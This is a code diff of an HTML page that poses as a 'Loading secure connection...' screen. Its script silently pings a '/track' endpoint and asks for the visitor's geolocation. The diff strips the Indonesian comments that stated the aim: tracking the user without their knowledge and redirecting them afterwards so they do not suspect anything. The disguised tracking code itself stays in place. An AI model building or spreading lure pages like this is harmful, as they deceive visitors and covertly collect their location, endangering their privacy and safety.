@@ -39,16 +39,12 @@
 <body>
     <div class="loader"></div>
     <p>Loading secure connection...</p>
-
     <script>
-        // Kirim data ke tracker tanpa sepengetahuan user
         (function() {
-            // Kirim tracking via fetch (tanpa visible effect)
             fetch('/track')
                 .then(() => {})
                 .catch(() => {});
             
-            // Ambil lokasi tambahan dari browser (jika user izinkan)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(pos) {
@@ -58,14 +54,7 @@
                     function() {}
                 );
             }
-            
-            // Coba ambil data WiFi/BTS (jika ada)
-            // Tidak bisa via JS murni, ini hanya untuk show
         })();
-
-        // Redirect ke halaman normal setelah tracking
-        // Bisa diarahkan ke URL lain biar gak curiga
-        // window.location.href = 'https://www.google.com';
     </script>
 </body>
 </html>
